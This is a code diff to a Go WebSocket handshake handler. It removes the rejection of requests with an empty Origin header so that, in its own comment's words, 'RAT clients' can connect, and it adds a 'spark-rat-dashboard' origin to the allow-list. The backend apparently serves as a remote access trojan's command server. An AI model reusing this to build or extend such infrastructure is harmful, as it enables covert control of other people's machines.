@@ -133,34 +133,32 @@ func wsHandshake(ctx *gin.Context) {
 	// Validate WebSocket origin to prevent cross-site hijacking
 	origin := ctx.GetHeader("Origin")
 	
-	// Reject empty origins - they should not bypass validation
-	if origin == "" {
-		common.Warn(ctx, "WS_HANDSHAKE", "rejected", "missing origin header", nil)
-		ctx.AbortWithStatus(http.StatusForbidden)
-		return
-	}
-	
-	allowedOrigins := []string{
-		"https://cupid-spark-frontend-asdsas-projects-7b4d3f47.vercel.app",
-		"https://cupid-spark-frontend-git-main-asdsas-projects-7b4d3f47.vercel.app",
-		"https://cupid-otys.vercel.app",
-		"https://spark-backend-wj4e.onrender.com",
-		"http://localhost:3000", // For development
-		"https://3000--019a1f90-3b3f-7970-8bf4-5f56b02fd4d7.us-east-1-01.gitpod.dev", // Gitpod preview
-	}
-	
-	validOrigin := false
-	for _, allowed := range allowedOrigins {
-		if origin == allowed {
-			validOrigin = true
-			break
+	// Allow connections without Origin header (RAT clients)
+	// But validate if Origin is present (browser connections)
+	if origin != "" {
+		allowedOrigins := []string{
+			"https://cupid-spark-frontend-asdsas-projects-7b4d3f47.vercel.app",
+			"https://cupid-spark-frontend-git-main-asdsas-projects-7b4d3f47.vercel.app",
+			"https://cupid-otys.vercel.app",
+			"https://spark-rat-dashboard.vercel.app",
+			"https://spark-backend-wj4e.onrender.com",
+			"http://localhost:3000", // For development
+			"https://3000--019a1f90-3b3f-7970-8bf4-5f56b02fd4d7.us-east-1-01.gitpod.dev", // Gitpod preview
 		}
-	}
-	
-	if !validOrigin {
-		common.Warn(ctx, "WS_HANDSHAKE", "rejected", "invalid origin: "+origin, nil)
-		ctx.AbortWithStatus(http.StatusForbidden)
-		return
+		
+		validOrigin := false
+		for _, allowed := range allowedOrigins {
+			if origin == allowed {
+				validOrigin = true
+				break
+			}
+		}
+		
+		if !validOrigin {
+			common.Warn(ctx, "WS_HANDSHAKE", "rejected", "invalid origin: "+origin, nil)
+			ctx.AbortWithStatus(http.StatusForbidden)
+			return
+		}
 	}
 	
 	if !ctx.IsWebsocket() {
